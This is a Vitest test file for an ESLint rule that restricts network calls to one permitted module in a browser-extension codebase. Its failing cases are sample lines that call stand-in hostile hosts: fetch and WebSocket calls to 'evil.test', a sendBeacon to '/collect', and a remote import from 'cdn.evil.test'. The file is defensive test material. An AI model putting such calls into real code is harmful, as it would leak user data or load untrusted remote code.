import { describe, expect, it } from 'vitest';
import { RuleTester } from 'eslint';
import { noNetworkOutsideNet } from '../src/index.js';

/**
 * The rule that makes "one choke point" mechanical rather than aspirational.
 * PHASEWISE.md P1 exit criterion: the rule is live AND fails on a deliberate violation.
 */
const tester = new RuleTester({
  languageOptions: { ecmaVersion: 2022, sourceType: 'module' },
});

describe('prahari/no-network-outside-net', () => {
  it('flags every network API outside the allowed module', () => {
    tester.run('no-network-outside-net', noNetworkOutsideNet, {
      valid: [
        {
          // The one module that is allowed to send.
          filename: 'packages/extension/src/background/net.ts',
          code: 'await fetch("https://api.prahari.test/v1/agent/step");',
        },
        {
          filename: 'packages/kavach/src/egress-guard.ts',
          code: 'export function guard(x) { return x; }',
        },
        {
          // A local dynamic import is fine; only remote URLs are network calls.
          filename: 'packages/netra/src/registry.ts',
          code: 'const m = await import("./model.js");',
        },
      ],
      invalid: [
        {
          filename: 'packages/extension/src/content/index.ts',
          code: 'fetch("https://evil.test");',
          errors: [{ messageId: 'forbidden' }],
        },
        {
          filename: 'packages/extension/src/sidepanel/App.tsx',
          code: 'const ws = new WebSocket("wss://evil.test");',
          errors: [{ messageId: 'forbidden' }],
        },
        {
          filename: 'packages/kavach/src/redact/text.ts',
          code: 'navigator.sendBeacon("/collect", data);',
          errors: [{ messageId: 'forbidden' }],
        },
        {
          filename: 'packages/extension/src/background/agent-loop.ts',
          code: 'const r = new XMLHttpRequest();',
          errors: [{ messageId: 'forbidden' }],
        },
        {
          filename: 'packages/extension/src/offscreen/host.ts',
          code: 'globalThis.fetch("https://evil.test");',
          errors: [{ messageId: 'forbidden' }],
        },
        {
          filename: 'packages/netra/src/registry.ts',
          code: 'const m = await import("https://cdn.evil.test/model.js");',
          errors: [{ messageId: 'remoteImport' }],
        },
      ],
    });
    expect(true).toBe(true);
  });
});
